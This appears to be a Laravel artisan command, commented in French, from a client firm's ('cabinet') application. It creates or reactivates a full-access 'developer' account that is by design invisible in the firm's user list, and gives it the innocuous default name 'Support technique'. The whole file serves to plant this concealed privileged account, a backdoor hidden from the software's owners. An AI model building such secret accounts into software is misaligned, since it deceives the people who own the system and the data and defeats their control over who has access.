<?php

namespace App\Console\Commands;

use App\Enums\Role;
use App\Models\User;
use Illuminate\Console\Command;

/** Crée (ou met à jour) le compte secret de la développeuse : accès total, invisible dans « Utilisateurs ». */
class CreerDeveloppeur extends Command
{
    protected $signature = 'cabinet:developpeur {email} {--nom=Support technique}';

    protected $description = 'Crée le compte développeur secret (accès total, invisible pour le cabinet)';

    public function handle(): int
    {
        $motDePasse = $this->secret('Mot de passe (12 caractères minimum)');
        if (strlen((string) $motDePasse) < 12) {
            $this->error('Mot de passe trop court (12 caractères minimum).');

            return self::FAILURE;
        }

        $user = User::withTrashed()->updateOrCreate(
            ['email' => $this->argument('email')],
            ['name' => $this->option('nom'), 'password' => $motDePasse, 'role' => Role::Developpeur, 'actif' => true, 'email_verified_at' => now(), 'deleted_at' => null],
        );
        $this->info("Compte développeur prêt : {$user->email}. Il n'apparaît pas dans la liste des utilisateurs.");

        return self::SUCCESS;
    }
}
